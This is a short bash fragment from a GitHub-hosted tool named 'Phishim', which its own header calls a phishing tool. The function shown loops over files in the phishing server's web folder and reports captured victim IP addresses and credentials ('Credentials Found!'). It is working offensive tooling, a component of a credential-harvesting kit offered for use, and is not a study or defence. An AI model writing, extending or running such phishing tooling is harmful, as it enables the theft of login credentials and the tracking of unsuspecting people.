#!/bin/bash

# Tool Name: Phishim
# Tool URI: https://github.com/SullFurix/Phishim/
# Description: Phishim is a phishing tool.
# Version: 4.0.0
# Author: SullFurix
# Author URI: https://github.com/SullFurix/
# Copyright: © 2020 SullFurix.
# License: GNU General Public License v3.0
# License URI: http://www.gnu.org/licenses/gpl-3.0.html

checkActivity() {

  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

  while [ true ]; do
    if [[ -e "web/$server/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
      catchIP
      rm -rf web/$server/ip.txt
    fi
    sleep 0.5
    if [[ -e "web/$server/usernames.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
      catchLog
      rm -rf web/$server/usernames.txt
    fi
    sleep 0.5
  done
}
